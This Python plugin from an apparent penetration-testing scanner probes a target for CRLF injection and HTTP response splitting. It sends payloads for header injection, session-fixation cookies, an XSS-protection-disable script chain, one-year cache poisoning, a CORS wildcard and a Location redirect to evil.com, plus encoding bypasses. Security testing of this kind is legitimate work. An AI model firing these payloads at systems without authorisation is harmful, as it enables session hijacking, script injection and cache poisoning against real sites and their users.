# plugins/crlf_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner CRLF Injection (HTTP Response Splitting).
    2026 Intel: CVE-2024-52875 (KerioControl CRLF→XSS→root), cache poisoning,
    XSS protection disable, cookie injection, log poisoning, email header injection.
    """
    import requests

    params = ["url", "redirect", "next", "return", "path", "page", "lang", "ref",
              "goto", "dest", "continue", "forward", "location", "uri", "callback"]
    payloads = [
        # Standard CRLF
        ("%0d%0aInjected-Header:CascavelTest", "CRLF_BASIC"),
        ("%0d%0a%0d%0a<html>CRLFTest</html>", "RESPONSE_SPLITTING"),
        # Session fixation
        ("%0d%0aSet-Cookie:session=pwned;Path=/", "SESSION_FIXATION"),
        # XSS protection disable (CVE-2024-52875 chain)
        ("%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1)</script>", "XSS_PROTECTION_DISABLE"),
        # Cache poisoning
        ("%0d%0aCache-Control:public,max-age=31536000%0d%0a%0d%0aPOISONED", "CACHE_POISON"),
        # Content-Type override
        ("%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>CRLF</h1>", "CONTENT_TYPE_OVERRIDE"),
        # Unicode CRLF bypass (UTF-8)
        ("%E5%98%8A%E5%98%8DInjected:UnicodeCRLF", "UNICODE_BYPASS"),
        # Double encoding
        ("%250d%250aInjected:DoubleEncode", "DOUBLE_ENCODE"),
        # Raw CRLF
        ("\r\nInjected-Header:RawCRLF", "RAW_CRLF"),
        # Line feed only
        ("%0aInjected:LF-Only", "LF_ONLY"),
        # Header injection for CORS bypass
        ("%0d%0aAccess-Control-Allow-Origin:*", "CORS_INJECTION"),
        # Location header injection (open redirect chain)
        ("%0d%0aLocation:https://evil.com", "LOCATION_INJECTION"),
    ]
    vulns = []

    for param in params:
        for payload, method in payloads:
            url = f"http://{target}/?{param}={payload}"
            try:
                resp = requests.get(url, timeout=6, allow_redirects=False)

                # Check injected headers
                for h_name, h_val in resp.headers.items():
                    h_low = h_name.lower()
                    if "injected" in h_low or "cascavel" in h_val.lower() or "unicodecrlf" in h_val.lower():
                        sev = "ALTO"
                        if method == "SESSION_FIXATION":
                            sev = "CRITICO"
                        elif method == "XSS_PROTECTION_DISABLE":
                            sev = "CRITICO"
                        elif method == "CORS_INJECTION":
                            sev = "CRITICO"

                        vulns.append({
                            "tipo": "CRLF_INJECTION",
                            "metodo": method,
                            "parametro": param,
                            "header_injetado": f"{h_name}: {h_val}",
                            "severidade": sev,
                        })
                        break

                # Check body split
                if "CRLFTest" in resp.text or "POISONED" in resp.text or "<h1>CRLF</h1>" in resp.text:
                    vulns.append({
                        "tipo": "HTTP_RESPONSE_SPLITTING",
                        "metodo": method,
                        "parametro": param,
                        "severidade": "CRITICO",
                        "descricao": "Full HTTP response splitting — body injetado!",
                    })

                # Check Set-Cookie injection
                for cookie_header in resp.headers.get("Set-Cookie", "").split(","):
                    if "session=pwned" in cookie_header.lower():
                        vulns.append({
                            "tipo": "SESSION_FIXATION",
                            "metodo": "CRLF_COOKIE_INJECTION",
                            "parametro": param,
                            "severidade": "CRITICO",
                        })

            except Exception:
                continue

    return {"plugin": "crlf_scanner", "resultados": vulns if vulns else "Nenhuma vulnerabilidade CRLF detectada"}
